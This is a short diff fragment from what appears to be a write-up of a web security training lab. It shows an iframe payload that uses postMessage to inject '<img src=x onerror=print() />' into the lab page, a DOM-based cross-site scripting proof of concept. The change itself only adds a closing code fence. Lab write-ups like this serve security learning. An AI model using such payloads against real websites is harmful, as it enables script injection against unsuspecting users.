@@ -33,6 +33,8 @@ Our payload will create a HTML element, an image which on load will call “prin
 
 ```
 <iframe src="https://0acb00d70448250981b389ca008b00e6.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print() />','*')" style="width:100%;height:100%">
+```
+
 
 View exploit:
 
